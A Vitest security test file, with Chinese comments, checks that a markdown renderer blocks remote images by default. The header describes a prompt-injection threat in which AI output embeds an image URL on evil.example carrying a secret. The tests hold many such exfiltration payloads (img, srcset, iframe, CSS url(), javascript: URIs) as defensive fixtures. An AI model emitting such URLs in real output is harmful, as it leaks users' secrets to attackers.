/**
 * 前端安全硬化：AI / 外部文档 markdown 里的远程图片「默认不加载、点击才加载」——SSR 真渲染 + 源码契约。
 *
 * 威胁：提示注入后 AI 输出 `![](https://evil.example/p?d=<密钥>)`，渲染时浏览器自动请求、把密钥带给攻击者
 * （CSP 目前只是 Report-Only、img-src 还含 https:，拦不住）。
 *
 * 做法：真实的 MarkdownText（Streamdown + 真实 rehype 链 + 真实 MarkdownImage / MarkdownLink）用 renderToStaticMarkup 渲染，
 * 断言「输出里没有 `<img`、没有那个 URL」。URL 里放 SECRET 当探针：它在任何属性 / 文本里出现就算泄漏。
 * 点击后的状态切换：没有 jsdom，不写 DOM 点击测试——「加载状态」是模块级 Set（lib/remote-image-gate），
 * 这里直接 mark 之后再 SSR，验证占位 → 真图；订阅 / 上限等语义在 tests/remote-image-gate.test.ts。
 * 局限：看不到真实浏览器的请求；onClick 是否接到 markRemoteImageLoaded 靠下面的源码契约。
 */
import { readdirSync, readFileSync } from "node:fs";
import path from "node:path";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Streamdown, defaultRemarkPlugins } from "streamdown";
import ts from "typescript";
import { afterEach, describe, expect, it } from "vitest";

import { MarkdownLink } from "@/components/markdown-link";
import { MarkdownText } from "@/components/markdown-text";
import { ImagePreviewProvider, MarkdownImage } from "@/components/ui/image-preview";
import { REVISION_REHYPE_PLUGINS } from "@/lib/revision-rehype-plugins";
import {
  classifyLoadableImageSrc,
  markRemoteImageLoaded,
  resetRemoteImageLoadedForTests,
} from "@/lib/remote-image-gate";
import { STREAMDOWN_REHYPE_PLUGINS } from "@/lib/streamdown-options";

afterEach(() => {
  resetRemoteImageLoadedForTests();
});

const ROOT = path.resolve(import.meta.dirname, "..");

const renderMT = (
  md: string,
  opts: { streaming?: boolean; blockImages?: boolean } = {},
): string =>
  renderToStaticMarkup(
    createElement(
      ImagePreviewProvider,
      null,
      createElement(MarkdownText, { text: md, ...opts }),
    ),
  );

/** 产物栏 / 修订视图那条路：Streamdown 直接配 a + img（artifact-panel / artifact-revision-view 同款接线），rehype 表可换 */
const renderStreamdown = (md: string, rehypePlugins: unknown = STREAMDOWN_REHYPE_PLUGINS): string =>
  renderToStaticMarkup(
    createElement(
      ImagePreviewProvider,
      null,
      createElement(
        Streamdown,
        {
          mode: "static",
          rehypePlugins,
          remarkPlugins: [...Object.values(defaultRemarkPlugins)],
          controls: { code: { copy: true, download: false }, table: false },
          components: { a: MarkdownLink, img: MarkdownImage },
        } as never,
        md,
      ),
    ),
  );

const URL_PLAIN = "https://evil.example/p?d=SECRET";
const hasImg = (html: string) => /<img\b/i.test(html);
/** URL 形态（`evil.example/…`）或探针值出现在输出任何位置 = 泄漏；占位里的 host 文本后面跟的是全角括号，不会误中 */
const leaks = (html: string) => /evil\.example\/|SECRET/.test(html);

describe("远程图（markdown / HTML 两种写法）：只有占位，没有 <img>、没有 URL", () => {
  const REMOTE = [
    ["markdown 图", `![示意图](${URL_PLAIN})`],
    ["markdown 图（尖括号 destination）", `![示意图](<${URL_PLAIN}>)`],
    ["HTML <img>", `<img src="${URL_PLAIN}" alt="示意图">`],
    ["scheme 缺斜杠 https:host", "![示意图](https:evil.example/p?d=SECRET)"],
    ["http（明文）", "![示意图](http://evil.example/p?d=SECRET)"],
    ["URL 里夹反斜杠（管线会规范成 /）", '<img src="https://evil.example/a\\b?d=SECRET" alt="示意图">'],
    ["URL 里夹空格（管线会编码成 %20）", '<img src="https://evil.example/a b?d=SECRET" alt="示意图">'],
  ] as const;

  it.each(REMOTE)("%s", (_label, md) => {
    const html = renderMT(md);
    expect(hasImg(html)).toBe(false);
    expect(leaks(html)).toBe(false);
    // 占位是一个带 aria-label 的按钮：「加载远程图片（域名）」+ alt
    expect(html).toMatch(/<button type="button" aria-label="加载远程图片（evil\.example）：示意图"/);
    expect(html).toContain("加载远程图片（evil.example）");
  });

  it("没有 alt：占位照给，aria-label 不带冒号尾巴", () => {
    const html = renderMT(`![](${URL_PLAIN})`);
    expect(hasImg(html)).toBe(false);
    expect(html).toContain('aria-label="加载远程图片（evil.example）"');
  });

  it("同一条路径上产物栏（Streamdown + MarkdownImage）同样拦截", () => {
    const html = renderStreamdown(`![示意图](${URL_PLAIN})`);
    expect(hasImg(html)).toBe(false);
    expect(leaks(html)).toBe(false);
    expect(html).toContain("加载远程图片（evil.example）");
  });
});

describe("畸形 / 不安全：不渲染图片、没有点击加载按钮、没有 URL", () => {
  const MALFORMED = [
    ["协议相对 //host", `![图](//evil.example/p?d=SECRET)`],
    ["javascript:", "![图](javascript:alert(1))"],
    ["大写 scheme HTTPS（管线 harden 先拦）", "![图](HTTPS://EVIL.example/p?d=SECRET)"],
    ["前后带空白的 src", '<img src="  https://evil.example/p?d=SECRET " alt="图">'],
    ["UNC 反斜杠", "<img src=\"\\\\evil.example\\share\\p?d=SECRET\" alt=\"图\">"],
    ["只有 srcset 没有 src", '<img srcset="https://evil.example/p?d=SECRET 1x" alt="图">'],
  ] as const;

  it.each(MALFORMED)("%s", (_label, md) => {
    const html = renderMT(md);
    expect(hasImg(html)).toBe(false);
    expect(leaks(html)).toBe(false);
    expect(html).not.toContain("加载远程图片"); // 畸形的连「点击加载」都不给
  });

  it("img 槽拿到的畸形 src（绕过管线直接喂组件）：blocked 文本占位，无按钮无 img", () => {
    for (const src of [
      "//evil.example/p?d=SECRET",
      "https://evil.example/a\\b?d=SECRET",
      " https://evil.example/p?d=SECRET",
      "https://evil.example/\tp?d=SECRET",
      "javascript:alert(1)",
      "ftp://evil.example/p?d=SECRET",
      "../../api/x",
    ]) {
      const html = renderToStaticMarkup(
        createElement(ImagePreviewProvider, null, createElement(MarkdownImage, { src, alt: "图" })),
      );
      expect(hasImg(html), src).toBe(false);
      expect(/<button\b/.test(html) && html.includes("加载远程图片"), src).toBe(false);
      expect(leaks(html), src).toBe(false);
    }
  });
});

describe("R7-6 无 scheme 的相对路径：不再原样渲染成同源 GET（`<img>` 不带 Origin、渲染即触发）", () => {
  const RELATIVE = [
    ["api/x（解析成同源 /api/x）", "api/repo-branches?path=x"],
    ["_next/x", "_next/static/x.png"],
    ["./x", "./x"],
    ["./api/x", "./api/repo-branches?path=x"],
    ["裸文件名 x.png", "x.png"],
    ["相对子目录", "images/a.png"],
  ] as const;

  it.each(RELATIVE)("%s → 没有 <img>、没有 src；组件层（img 槽）自己就拦成文本占位", (_label, src) => {
    // 管线路径：rehype-harden 对「没有 defaultOrigin 的相对 URL」多数会替换成 `[Image blocked: …]`（偶然的第一道）；
    // `./x` 这类会被管线规整成 `/x`、再被 toLoadableImageSrc 折进 /api/local-image 通道（本应用自己的本地图通道，安全）。
    // 这里不依赖这些偶然行为——下面「组件直喂」才是 R7-6 的修复点（img 槽对无 scheme 路径只放白名单）；
    // 管线版只钉整体结果：不出现 src 指向原相对地址 / 其它同源路径的 <img>（出现 <img> 就只能是本地图通道）
    const pipeline = (html: string) => {
      expect(html, src).not.toContain(`src="${src}"`);
      for (const m of html.matchAll(/<img\b[^>]*\bsrc="([^"]*)"/gi)) {
        expect(m[1], `${src} → ${html}`).toMatch(/^\/api\/local-image\?/);
      }
      expect(html).not.toContain("加载远程图片");
    };
    pipeline(renderMT(`![图](${src})`));
    pipeline(renderMT(`<img src="${src}" alt="图">`));
    pipeline(renderStreamdown(`![图](${src})`));
    pipeline(renderStreamdown(`![图](${src})`, REVISION_REHYPE_PLUGINS));
    const direct = renderToStaticMarkup(
      createElement(ImagePreviewProvider, null, createElement(MarkdownImage, { src, alt: "图" })),
    );
    expect(hasImg(direct), direct).toBe(false);
    expect(direct, src).toContain("[图片已拦截：图]"); // 我们自己的占位，不是 harden 的
    expect(direct).not.toContain("加载远程图片");
  });

  it("对照：白名单站内路径与本地通道仍然渲染", () => {
    for (const src of ["/api/tasks/t1/uploads/a.png", "/api/local-image?path=%2Fa.png"]) {
      const html = renderToStaticMarkup(
        createElement(ImagePreviewProvider, null, createElement(MarkdownImage, { src, alt: "图" })),
      );
      expect(html, src).toContain(`src="${src}"`);
    }
  });
});

describe("`<picture><source srcset>` 等其它「自动发请求」的通道：URL 不出现在输出里", () => {
  const CHANNELS = [
    ["<picture><source srcset>（本地 <img> 当幌子）", `<picture><source srcset="${URL_PLAIN}"><img src="/api/local-image?path=%2Fa.png"></picture>`],
    ["<picture><source src>", `<picture><source src="${URL_PLAIN}"><img src="/api/local-image?path=%2Fa.png"></picture>`],
    ["<img src=本地 srcset=远程>", `<img src="/api/tasks/t1/uploads/a.png" srcset="${URL_PLAIN} 1x" alt="x">`],
    ["<video poster / src>", `<video poster="${URL_PLAIN}" src="${URL_PLAIN}"></video>`],
    ["<video><source>", `<video controls><source src="${URL_PLAIN}"></video>`],
    ["<audio>", `<audio src="${URL_PLAIN}"></audio>`],
    ["<iframe>", `<iframe src="${URL_PLAIN}"></iframe>`],
    ["<embed>", `<embed src="${URL_PLAIN}">`],
    ["<object data>", `<object data="${URL_PLAIN}"></object>`],
    ["<link rel=stylesheet>", `<link rel="stylesheet" href="${URL_PLAIN}">`],
    ["style background-image", `<div style="background-image:url(${URL_PLAIN})">x</div>`],
    ["<svg><image href>", `<svg><image href="${URL_PLAIN}"/></svg>`],
    ["<input type=image>", `<input type="image" src="${URL_PLAIN}">`],
    ["<table background>", `<table background="${URL_PLAIN}"><tr><td background="${URL_PLAIN}">x</td></tr></table>`],
    ["引用式图片", `![图][r]\n\n[r]: ${URL_PLAIN}`],
  ] as const;

  it.each(CHANNELS)("%s", (_label, md) => {
    for (const html of [renderMT(md), renderStreamdown(md), renderStreamdown(md, REVISION_REHYPE_PLUGINS)]) {
      expect(leaks(html)).toBe(false);
      expect(/<source\b/i.test(html)).toBe(false);
      expect(/srcset/i.test(html)).toBe(false);
    }
  });

  it("<picture> 里的 <img> 仍走 MarkdownImage：本地图照渲染（只是没有 <source> 能改写来源）", () => {
    const html = renderMT(`<picture><source srcset="${URL_PLAIN}"><img src="/api/local-image?path=%2Fa.png"></picture>`);
    expect(html).toContain('src="/api/local-image?path=%2Fa.png"');
  });
});

describe("不拦的照旧渲染（本地图 / 站内路径 / 本地绝对路径）", () => {
  it("本地绝对路径 → /api/local-image 通道，渲染成可点开大图的 <img>", () => {
    const html = renderMT("![二维码](/Users/x/qr.png)");
    expect(html).toContain('src="/api/local-image?path=%2FUsers%2Fx%2Fqr.png"');
    expect(html).toContain('aria-label="查看大图:二维码"');
    expect(html).not.toContain("加载远程图片");
  });

  it("file:// 与带空格的本地路径同样照旧", () => {
    expect(renderMT("![图](file:///Users/x/qr.png)")).toContain('src="/api/local-image?path=');
    expect(renderMT("![图](/Users/x/Application Support/qr.png)")).toContain('src="/api/local-image?path=');
  });

  it("站内上传路径（白名单的 /api/tasks/<id>/uploads/<文件>）原样渲染", () => {
    const html = renderMT('<img src="/api/tasks/t1/uploads/a.png" alt="上传图">');
    expect(html).toContain('src="/api/tasks/t1/uploads/a.png"');
  });

  it("MarkdownImage 直接收到 data: / blob: / 站内路径：原样渲染（这些不发网络请求）", () => {
    for (const src of [
      "data:image/png;base64,iVBORw0KGgo=",
      "blob:https://example.com/0b1f5a52-aaaa-bbbb-cccc-000000000000",
      "/api/tasks/t1/uploads/a.png",
    ]) {
      const html = renderToStaticMarkup(
        createElement(ImagePreviewProvider, null, createElement(MarkdownImage, { src, alt: "图" })),
      );
      expect(html, src).toContain(`src="${src}"`);
      expect(html, src).not.toContain("加载远程图片");
    }
  });
});

describe("点击加载后的状态：已加载 → 真 <img>（规范化 URL）；其它 URL 仍是占位", () => {
  const key = (u: string): string => {
    const g = classifyLoadableImageSrc(u);
    if (g.kind !== "remote") throw new Error(`${u} 应是 remote`);
    return g.key;
  };

  it("mark 之前占位、mark 之后渲染 <img src=规范化 URL>、占位消失", () => {
    const md = `![示意图](${URL_PLAIN})`;
    expect(hasImg(renderMT(md))).toBe(false);
    markRemoteImageLoaded(key(URL_PLAIN));
    const html = renderMT(md);
    expect(html).toContain(`<img src="${URL_PLAIN}"`);
    expect(html).toContain('aria-label="查看大图:示意图"');
    expect(html).not.toContain("加载远程图片");
  });

  it("只翻被点的那张：另一张 URL 仍是占位（虚拟列表重挂载时不会把没点的图也加载了）", () => {
    markRemoteImageLoaded(key(URL_PLAIN));
    const html = renderMT(`![一](${URL_PLAIN})\n\n![二](https://evil.example/other.png)`);
    expect(html.match(/<img\b/g)).toHaveLength(1);
    expect(html).toContain("加载远程图片（evil.example）");
  });

  it("大小写 / 缺斜杠写法规范成同一个 key：点了一种，另一种写法也已加载", () => {
    markRemoteImageLoaded(key(URL_PLAIN));
    expect(renderMT("![图](https:evil.example/p?d=SECRET)")).toContain(`<img src="${URL_PLAIN}"`);
  });

  it("已加载的也走同一个渲染：HTML <img> 写法同样翻成真图", () => {
    markRemoteImageLoaded(key(URL_PLAIN));
    expect(renderMT(`<img src="${URL_PLAIN}" alt="x">`)).toContain(`<img src="${URL_PLAIN}"`);
  });

  it("畸形 URL 即使「被点过」也不会渲染（blocked 没有 key 可记）", () => {
    for (const bad of ["//evil.example/p?d=SECRET", "javascript:alert(1)"]) {
      expect(classifyLoadableImageSrc(bad).kind).not.toBe("remote");
    }
    expect(hasImg(renderMT("![图](//evil.example/p?d=SECRET)"))).toBe(false);
  });
});

describe("流式输出：半截 / 完整 URL 都只有占位（默认就不发请求）", () => {
  it("每个前缀都不出 <img>、不泄漏 URL", () => {
    const md = `前文\n\n![示意图](${URL_PLAIN}) 后文`;
    for (let i = 1; i <= md.length; i++) {
      const html = renderMT(md.slice(0, i), { streaming: true });
      expect(hasImg(html), `前缀 ${i}`).toBe(false);
      expect(leaks(html), `前缀 ${i}`).toBe(false);
    }
  });

  it("流式 + 引用式图片（定义行在后面）也不出 <img>", () => {
    const md = `![图][r]\n\n[r]: ${URL_PLAIN}\n`;
    for (let i = 1; i <= md.length; i++) {
      const html = renderMT(md.slice(0, i), { streaming: true });
      expect(hasImg(html), `前缀 ${i}`).toBe(false);
      expect(leaks(html), `前缀 ${i}`).toBe(false);
    }
  });

  it("定稿（非流式）的引用式图片：占位", () => {
    const html = renderMT(`![图][r]\n\n[r]: ${URL_PLAIN}\n`);
    expect(hasImg(html)).toBe(false);
    expect(html).toContain("加载远程图片（evil.example）");
  });
});

describe("链接里套远程图（徽章写法）：文本占位，不嵌套按钮、不出 <img>，链接本身保留", () => {
  it("[![a](远程图)](链接)", () => {
    const html = renderMT(`[![构建状态](${URL_PLAIN})](https://github.com/x/y)`);
    expect(hasImg(html)).toBe(false);
    expect(leaks(html)).toBe(false);
    expect(html).toContain('href="https://github.com/x/y"');
    expect(html).toContain("[远程图片：构建状态（evil.example）]");
    // a 里面没有按钮（按钮套 a 是无效 HTML）
    const anchor = /<a\b[^>]*>[\s\S]*?<\/a>/.exec(html)?.[0] ?? "";
    expect(anchor).not.toMatch(/<button\b/);
  });
});

describe("不可信来源的 blockImages 档保持原样（群消息：连占位按钮都没有）", () => {
  it("blockImages：[图片：alt] 纯文本，不是加载按钮", () => {
    const html = renderMT(`![示意图](${URL_PLAIN})`, { blockImages: true });
    expect(html).toContain("[图片：示意图]");
    expect(hasImg(html)).toBe(false);
    expect(html).not.toContain("加载远程图片");
  });
});

// ───────── 源码契约：渲染结果里看不到的接线 + 全仓入口护栏 ─────────

const read = (rel: string): string => readFileSync(path.join(ROOT, rel), "utf8");

const IMAGE_PREVIEW = "src/components/ui/image-preview.tsx";

/** 在名为 `scope` 的顶层 const 里收集所有 JSX 标签 → 各自的属性名 */
const jsxIn = (file: string, scope: string): Array<{ tag: string; attrs: string[] }> => {
  const sf = ts.createSourceFile(file, read(file), ts.ScriptTarget.Latest, true, ts.ScriptKind.TSX);
  const out: Array<{ tag: string; attrs: string[] }> = [];
  const visit = (n: ts.Node) => {
    if (ts.isJsxElement(n) || ts.isJsxSelfClosingElement(n)) {
      const open = ts.isJsxElement(n) ? n.openingElement : n;
      out.push({
        tag: open.tagName.getText(),
        attrs: open.attributes.properties.filter(ts.isJsxAttribute).map((a) => a.name.getText()),
      });
    }
    ts.forEachChild(n, visit);
  };
  for (const st of sf.statements) {
    if (ts.isVariableStatement(st) && st.declarationList.declarations.some((d) => d.name.getText() === scope)) {
      visit(st);
    }
  }
  return out;
};

describe("源码契约：占位里没有任何会发请求的元素；点击接到 markRemoteImageLoaded", () => {
  it("RemoteMarkdownImage 里只有 button / span / 图标，没有 img / source / picture / video 等", () => {
    const tags = jsxIn(IMAGE_PREVIEW, "RemoteMarkdownImage").map((t) => t.tag);
    expect(tags.length).toBeGreaterThan(0);
    expect([...new Set(tags)].sort()).toEqual(["ImageDown", "button", "span"]);
  });

  it("占位按钮：type=button、onClick、aria-label 齐全；onClick 里调的是 markRemoteImageLoaded(gate.key)", () => {
    const buttons = jsxIn(IMAGE_PREVIEW, "RemoteMarkdownImage").filter((t) => t.tag === "button");
    expect(buttons).toHaveLength(1);
    expect(buttons[0]?.attrs).toEqual(expect.arrayContaining(["type", "onClick", "aria-label", "className"]));
    const src = read(IMAGE_PREVIEW);
    expect(src).toMatch(/onClick=\{\(\) => markRemoteImageLoaded\(gate\.key\)\}/);
  });

  it("MarkdownImage（分发器）自己不渲染 img / button：远程走 RemoteMarkdownImage、被拦走文本占位", () => {
    const own = jsxIn(IMAGE_PREVIEW, "MarkdownImage").map((t) => t.tag);
    expect(own).not.toContain("img");
    expect(own).not.toContain("button");
    const src = read(IMAGE_PREVIEW);
    const at = src.indexOf("export const MarkdownImage");
    const body = src.slice(at);
    // 判定在渲染之前、且被拦 / 远程两个分支都在 renderLoadedMarkdownImage 之前返回
    const iClassify = body.indexOf("classifyLoadableImageSrc(url)");
    const iBlocked = body.indexOf('gate.kind === "blocked"');
    const iRemote = body.indexOf('gate.kind === "remote"');
    const iLoaded = body.indexOf("renderLoadedMarkdownImage(");
    expect(iClassify).toBeGreaterThan(-1);
    expect(iBlocked).toBeGreaterThan(iClassify);
    expect(iRemote).toBeGreaterThan(iBlocked);
    expect(iLoaded).toBeGreaterThan(iRemote);
    // 直接渲染用的是 gate.src（direct 分支的地址），不是原始 src
    expect(body).toContain("url: gate.src");
  });

  it("img 只在 renderLoadedMarkdownImage 里出现（image-preview 里其它地方的 <img> 是本地 / 已选图：灯箱、缩略图）", () => {
    const loaded = jsxIn(IMAGE_PREVIEW, "renderLoadedMarkdownImage");
    expect(loaded.filter((t) => t.tag === "img")).toHaveLength(2);
    expect(loaded.filter((t) => t.tag === "button")).toHaveLength(1);
  });
});

/** 递归列出 src 下的 .ts / .tsx */
const listSrc = (dir: string): string[] =>
  (readdirSync(path.join(ROOT, dir), { recursive: true }) as string[])
    .filter((f) => /\.(ts|tsx)$/.test(f))
    .map((f) => path.posix.join(dir, f.split(path.sep).join("/")));

/**
 * 这个文件里有没有「真的会渲染图片」的代码：JSX `<img>` / `<Image>`（next/image）、`createElement("img", …)`、import next/image。
 * 用 AST 判，不看注释 / 字符串里的 `<img`。
 */
const rendersImage = (file: string): boolean => {
  const text = read(file);
  if (!/img|next\/image/.test(text)) return false;
  const sf = ts.createSourceFile(file, text, ts.ScriptTarget.Latest, true, file.endsWith("x") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  let found = false;
  const visit = (n: ts.Node) => {
    if (found) return;
    if (ts.isJsxOpeningElement(n) || ts.isJsxSelfClosingElement(n)) {
      if (n.tagName.getText() === "img") found = true;
    } else if (ts.isImportDeclaration(n) && ts.isStringLiteral(n.moduleSpecifier) && n.moduleSpecifier.text === "next/image") {
      found = true;
    } else if (
      ts.isCallExpression(n) &&
      /(?:^|\.)createElement$/.test(n.expression.getText()) &&
      n.arguments[0] &&
      ts.isStringLiteralLike(n.arguments[0]) &&
      n.arguments[0].text === "img"
    ) {
      found = true;
    }
    ts.forEachChild(n, visit);
  };
  visit(sf);
  return found;
};

describe("全仓入口护栏：新增的图片 / markdown 渲染入口必须过评审（否则这里红）", () => {
  const files = listSrc("src");

  it("真正渲染 <img> 的只有 image-preview（受控）、预览窗的图片查看器（本地媒体通道 / SVG blob）与内置浏览器面板的两处（遮盖占位图 / favicon）；预览正文自己不再渲染 <img>；next/image 一个都没有", () => {
    // 2026-11-06：预览窗升级后，原先写在 local-file-preview-body 里的 <img> 搬进了独立的图片查看器（缩放 / 旋转 / 平移）。
    // 名单里「预览正文」换成「图片查看器」；它的 src 来源由下面一条钉死。
    // 2026-11-07：内置浏览器面板新增两处 <img>，来源由再下面一条钉死。
    const hits = files.filter(rendersImage).sort();
    expect(hits).toEqual([
      "src/components/browser/browser-panel.tsx",
      "src/components/browser/browser-viewport.tsx",
      "src/components/preview/image-viewer.tsx",
      "src/components/ui/image-preview.tsx",
    ]);
  });

  it("内置浏览器面板的两处 <img> 的 src 来源被钉死：遮盖占位图只吃主进程 setCovered 给的 dataURL；favicon 只吃 safeFaviconSrc（仅 https / data:image 位图，拒回环 / 内网 / 应用同源）且不带 Referer，都不吃 markdown / 模型输出", () => {
    // 这两处不属于「markdown 里的远程图被模型诱导去拼 URL 外泄」那类风险：
    // - 遮盖占位图：src 是主进程截图转的 dataURL，不发任何网络请求；
    // - favicon：URL 由用户正在浏览的页面决定（该域名本来就被浏览器面板访问过），拿不到 Flowship 的任何数据；
    //   safeFaviconSrc 挡掉 javascript: / file: 等，no-referrer 保证不把 Flowship 的地址带出去。
    const viewport = read("src/components/browser/browser-viewport.tsx");
    expect(viewport).toMatch(/<img\s+src=\{coverImage\}/);
    expect(read("src/components/browser/use-overlay-cover.ts")).toContain("await bridge.setCovered(taskId, true)");
    const panel = read("src/components/browser/browser-panel.tsx");
    expect(panel).toContain("safeFaviconSrc(tab.favicon)");
    expect(panel).toMatch(/<img\s+src=\{src\}[^>]*referrerPolicy="no-referrer"/s);
    // 面板里的 <img> 恰好这一处；多一处就要过评审
    expect(panel.match(/<img\b/g)).toHaveLength(1);
    expect(viewport.match(/<img\b/g)).toHaveLength(1);
  });

  it("图片查看器的 <img> 只吃调用方给的 src；调用方只有两个：预览正文（服务端给的本地媒体路径 mediaPath）与 SVG 查看器（blob URL），都不吃 markdown", () => {
    expect(read("src/components/preview/image-viewer.tsx")).toMatch(/<img\s+src=\{src\}/);
    const body = read("src/components/ui/local-file-preview-body.tsx");
    expect(body).toContain("withVersion(data.mediaPath, data.mtimeMs)");
    // 预览正文渲染 markdown 一律走 MarkdownViewer → MarkdownText（img 槽有闸门）
    expect(body).not.toMatch(/from\s+["']streamdown["']/);
    expect(read("src/components/preview/svg-viewer.tsx")).toContain("URL.createObjectURL(");
    // 新增任何第三个 ImageViewer 调用方都要过评审（改这个名单）
    const callers = files.filter((f) => f.endsWith(".tsx") && /<ImageViewer\b/.test(read(f))).sort();
    expect(callers).toEqual([
      "src/components/preview/svg-viewer.tsx",
      "src/components/ui/local-file-preview-body.tsx",
    ]);
  });

  it("直接 <Streamdown> 的只有 markdown-text / artifact-panel / artifact-revision-view，且 img 槽都接到 MarkdownImage", () => {
    const hits = files.filter((f) => f.endsWith(".tsx") && /<Streamdown\b/.test(read(f))).sort();
    expect(hits).toEqual([
      "src/components/markdown-text.tsx",
      "src/components/tasks/artifact-panel.tsx",
      "src/components/tasks/artifact-revision-view.tsx",
    ]);
    // 聊天 / 文件预览 / 子代理 / ask 卡：MarkdownText；blockImages（群消息）用 BlockedMarkdownImage，其余 MarkdownImage
    expect(read("src/components/markdown-text.tsx")).toContain(
      "img: blockImages ? BlockedMarkdownImage : MarkdownImage,",
    );
    // 产物栏：自己的 buildMarkdownComponents
    expect(read("src/components/tasks/artifact-panel.tsx")).toMatch(/\bimg:\s*MarkdownImage\b/);
    // 修订视图：不自己配 img，展开 panel 传来的 baseComponents（同一个 MarkdownImage）；panel 传的就是 markdownComponents
    const revision = read("src/components/tasks/artifact-revision-view.tsx");
    expect(revision).toContain("...baseComponents");
    expect(revision).not.toMatch(/\bimg\s*:/);
    expect(read("src/components/tasks/artifact-panel.tsx")).toContain("baseComponents={markdownComponents}");
  });

  it("三个 Streamdown 入口的 rehype 表都来自 STREAMDOWN_REHYPE_PLUGINS（含剥 <source>）；修订表是它的派生", () => {
    expect(read("src/components/markdown-text.tsx")).toMatch(/rehypePlugins=\{STREAMDOWN_REHYPE_PLUGINS\}/);
    expect(read("src/components/tasks/artifact-panel.tsx")).toMatch(/rehypePlugins=\{STREAMDOWN_REHYPE_PLUGINS\}/);
    expect(read("src/lib/revision-rehype-plugins.ts")).toContain("STREAMDOWN_REHYPE_PLUGINS.map(");
    expect(read("src/lib/streamdown-options.ts")).toMatch(
      // sanitize → 剥 <source>/srcset → mermaid 外部资源闸（R7-1，tests/mermaid-source-gate.test.ts）→ harden
      /defaultRehypePlugins\.sanitize,\s*rehypeStripMediaSources,\s*rehypeGateMermaidBlocks,\s*defaultRehypePlugins\.harden/,
    );
  });
});
